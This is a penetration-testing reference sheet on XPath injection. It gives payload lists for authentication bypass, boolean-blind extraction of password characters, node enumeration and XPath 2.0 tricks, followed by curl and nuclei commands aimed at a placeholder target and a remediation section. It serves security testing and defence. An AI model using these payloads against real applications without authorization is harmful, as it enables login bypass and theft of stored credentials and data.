# XPath Injection Testing

## Overview
XPath Injection exploits applications that use user input in XPath queries to navigate XML documents. Attackers can manipulate queries to bypass authentication, extract data, or access unauthorized portions of XML data stores.

## Classification
- **CWE:** CWE-643 (Improper Neutralization of Data within XPath Expressions)
- **OWASP:** A03:2021 - Injection
- **CVSS Base:** 7.5 - 9.8

## Detection Methodology

### 1. XPath Query Structure
```xpath
/users/user[username='INPUT' and password='INPUT']
//book[title='INPUT']
//*[contains(name, 'INPUT')]
```

### 2. Authentication Bypass
```xpath
# Original: /users/user[username='USER' and password='PASS']

# Bypass:
' or '1'='1
' or '1'='1' or '1'='1
' or 1=1 or '
admin' or '1'='1
' or ''='
') or ('1'='1
') or true() or ('
```

### 3. Boolean-Based Blind XPath
```xpath
# String length extraction
' or string-length(//user[1]/password)=5 or '1'='2

# Character extraction
' or substring(//user[1]/password,1,1)='a' or '1'='2
' or substring(//user[1]/password,2,1)='b' or '1'='2

# Node count
' or count(//user)=3 or '1'='2
```

### 4. Data Extraction
```xpath
# Extract all node names
' or name(//*)='users' or '1'='2

# Navigate parent/child nodes
' or //user[1]/child::*[1]='admin' or '1'='2

# Extract via error messages
' or //*[name()='username' and position()=1]='admin

# String extraction character by character
' or substring(//user[position()=1]/password,1,1)='a
' or substring(//user[position()=1]/password,2,1)='d
```

### 5. XPath 2.0 Specific
```xpath
# String manipulation
' or matches(//user[1]/password, '^admin') or '1'='2
# Conditional
' or if(//user[1]/role='admin', true(), false()) or '1'='2
# Regular expressions
' or matches(//user[1]/name, '.*admin.*') or '1'='2
```

## Enumeration Techniques

### Full Document Extraction
1. Count root children: `count(/*[1]/child::*)`
2. Extract node names: `name(/*[1]/child::*[position()=N])`
3. Count attributes: `count(/*[1]/child::*[1]/@*)`
4. Extract attribute names: `name(/*[1]/child::*[1]/@*[position()=N])`
5. Extract text content character by character

### Automated Extraction Logic
```
For node_pos = 1 to count(//node):
  For char_pos = 1 to string-length(//node[node_pos]):
    For each char in charset:
      Test: substring(//node[node_pos], char_pos, 1) = char
      If true → append char to result
```

## Tool Usage
```bash
# Manual testing with curl
curl "http://target.com/search?name=' or '1'='1"

# Automated XPath injection testing
# Use generic injection scanners with XPath payloads

# Nuclei templates
nuclei -u http://target.com -t xpath/ -batch
```

## Remediation
1. **Parameterized XPath queries** (XPath variables)
2. **Input validation** — reject `' " [ ] / = @ *`
3. **Precompiled XPath expressions**
4. **Least privilege** on XML data access
5. **Consider JSON/SQL** alternatives to XML data stores

## Evidence Collection
- XPath payload and response
- XML structure mapped
- Data extracted
- Authentication bypass proof
- Full document structure if accessible
